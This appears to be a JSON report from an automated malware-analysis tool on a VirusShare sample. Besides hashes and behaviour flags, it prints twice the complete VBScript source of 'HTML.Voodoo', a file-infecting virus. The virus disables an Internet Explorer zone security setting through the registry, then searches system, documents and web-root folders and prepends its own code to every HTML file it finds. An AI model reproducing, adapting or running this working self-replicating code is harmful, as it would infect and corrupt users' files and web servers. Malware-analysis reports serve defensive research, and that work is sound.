{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Call": "May call a DLL using Excel 4 Macros",
            "Chr": "May attempt to obfuscate specific str",
            "CreateObject": "May create an OLE object",
            "Shell": "May run an executable file or a system command",
            "Shell32": "May run an executable file or a system command",
            "System": "May run an executable file or a system command on a Mac",
            "WScript.Shell": "May run an executable file or a system command",
            "Windows": "May enumerate application windows",
            "Write": "May write to a file"
        },
        "macro": "<!--Voodoo-->\n<html><body>\n<script Language=\"VBScript\"><!--\n' HTML.Voodoo \nOn Error Resume Next\nif location.protocol = \"file:\" then\nRandomize\nSet WshShell = CreateObject(\"WScript.Shell\")\nWshShell.Regwrite\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\0\\1201\" , 0, \"REG_DWORD\"\nWshShell.RegWrite\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\0\\1201\" , 0, \"REG_DWORD\"\nif location.protocol = \"file:\" then\nSet FSO = CreateObject(\"Scripting.FileSystemObject\")\nHPath = Replace(location.href, \"/\", \"\\\")\nHPath = Replace(HPath, \"file:\\\\\\\", \"\")\nHPath = FSO.GetParentFolderName(HPath)\nSet TRange = document.body.createTextRange\nCall GetFolder(HPath)\nCall GetFolder(\"C:\\\")\nCall GetFolder(\"C:\\Windows\\Desktop\")\nCall GetFolder(\"C:\\Windows\\Web\")\nCall GetFolder(\"C:\\Windows\\Web\\Wallpaper\")\nCall GetFolder(\"C:\\Windows\\Help\")\nCall GetFolder(\"C:\\Windows\\Temp\")\nCall GetFolder(\"C:\\My Documents\")\nCall GetFolder(\"C:\\Program Files\\Microsoft Office\\Office\\Headers\")\nCall GetFolder(\"C:\\Program Files\\Internet Explorer\\Connection Wizard\")\nCall GetFolder(\"C:\\Inetpub\\wwwroot\")\nend if\np = Int(Rnd * 30) + 1\nIf Day(Now()) = p Then\nMsgBox(\"Voodoo by ULTRAS\"), vbCritical\nWshShell.RegWrite \"HKEY_CLASSES_ROOT\\htmlfile\\DefaultIcon\\\", \"C:\\Win98\\System\\Shell32.dll,32\"\nEnd If\nSub GetFolder(InfPath)\nOn Error Resume Next\nif FSO.FolderExists(InfPath) then\nDo\nSet FolderObj = FSO.GetFolder(InfPath)\nInfPath = FSO.GetParentFolderName(InfPath)\nSet FO = FolderObj.Files\nFor each target in FO\nExtName = lcase(FSO.GetExtensionName(target.Name))\nif ExtName = \"htt\" or ExtName = \"htm\" or ExtName = \"html\" then\nSet Real = FSO.OpenTextFile(target.path, 1, False)\nif Real.readline <> \"<!--Voodoo-->\" then\nReal.close()\nGetFile(target.path)\nelse\nReal.close()\nend if\nend if\nnext\nLoop Until FolderObj.IsRootFolder = True\nend if\nEnd Sub\nSub GetFile(GetFileName)\nSet Real = FSO.OpenTextFile(GetFileName, 1, False)\nFileContents = Real.ReadAll()\nReal.close()\nSet Real = FSO.OpenTextFile(GetFileName, 2, False)\nReal.WriteLine \"<!--Voodoo-->\"\nReal.Write(\"<html><body>\" + Chr(13) + Chr(10))\nReal.WriteLine TRange.htmlText\nReal.WriteLine(\"</body></html>\")\nReal.Write(FileContents)\nReal.close()\nEnd Sub\nend if\n--></script>\n="
    },
    "filename": "VirusShare_38960665eefe204e407a0bd1a156b7be",
    "filesize": 2297,
    "filetype": "HTML document, ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "38960665eefe204e407a0bd1a156b7be",
        "sha1": "34c1fe6377732677abd3035d3e5128cbfa97e9b6",
        "sha256": "ac4ce76e26cbf7aa8665205cbb804504dd7ff9d1e5e5032119a03a909c974e1a"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "<!--Voodoo-->",
            "<html><body>",
            "<script Language=\"VBScript\"><!--",
            "' HTML.Voodoo ",
            "On Error Resume Next",
            "if location.protocol = \"file:\" then",
            "Randomize",
            "Set WshShell = CreateObject(\"WScript.Shell\")",
            "WshShell.Regwrite\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\0\\1201\" , 0, \"REG_DWORD\"",
            "WshShell.RegWrite\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\0\\1201\" , 0, \"REG_DWORD\"",
            "if location.protocol = \"file:\" then",
            "Set FSO = CreateObject(\"Scripting.FileSystemObject\")",
            "HPath = Replace(location.href, \"/\", \"\\\")",
            "HPath = Replace(HPath, \"file:\\\\\\\", \"\")",
            "HPath = FSO.GetParentFolderName(HPath)",
            "Set TRange = document.body.createTextRange",
            "Call GetFolder(HPath)",
            "Call GetFolder(\"C:\\\")",
            "Call GetFolder(\"C:\\Windows\\Desktop\")",
            "Call GetFolder(\"C:\\Windows\\Web\")",
            "Call GetFolder(\"C:\\Windows\\Web\\Wallpaper\")",
            "Call GetFolder(\"C:\\Windows\\Help\")",
            "Call GetFolder(\"C:\\Windows\\Temp\")",
            "Call GetFolder(\"C:\\My Documents\")",
            "Call GetFolder(\"C:\\Program Files\\Microsoft Office\\Office\\Headers\")",
            "Call GetFolder(\"C:\\Program Files\\Internet Explorer\\Connection Wizard\")",
            "Call GetFolder(\"C:\\Inetpub\\wwwroot\")",
            "end if",
            "p = Int(Rnd * 30) + 1",
            "If Day(Now()) = p Then",
            "MsgBox(\"Voodoo by ULTRAS\"), vbCritical",
            "WshShell.RegWrite \"HKEY_CLASSES_ROOT\\htmlfile\\DefaultIcon\\\", \"C:\\Win98\\System\\Shell32.dll,32\"",
            "End If",
            "Sub GetFolder(InfPath)",
            "On Error Resume Next",
            "if FSO.FolderExists(InfPath) then",
            "Set FolderObj = FSO.GetFolder(InfPath)",
            "InfPath = FSO.GetParentFolderName(InfPath)",
            "Set FO = FolderObj.Files",
            "For each target in FO",
            "ExtName = lcase(FSO.GetExtensionName(target.Name))",
            "if ExtName = \"htt\" or ExtName = \"htm\" or ExtName = \"html\" then",
            "Set Real = FSO.OpenTextFile(target.path, 1, False)",
            "if Real.readline <> \"<!--Voodoo-->\" then",
            "Real.close()",
            "GetFile(target.path)",
            "else",
            "Real.close()",
            "end if",
            "end if",
            "next",
            "Loop Until FolderObj.IsRootFolder = True",
            "end if",
            "End Sub",
            "Sub GetFile(GetFileName)",
            "Set Real = FSO.OpenTextFile(GetFileName, 1, False)",
            "FileContents = Real.ReadAll()",
            "Real.close()",
            "Set Real = FSO.OpenTextFile(GetFileName, 2, False)",
            "Real.WriteLine \"<!--Voodoo-->\"",
            "Real.Write(\"<html><body>\" + Chr(13) + Chr(10))",
            "Real.WriteLine TRange.htmlText",
            "Real.WriteLine(\"</body></html>\")",
            "Real.Write(FileContents)",
            "Real.close()",
            "End Sub",
            "end if",
            "--></script>"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "file:\\\\\\"
        ]
    },
    "time": "0:00:00.272179",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
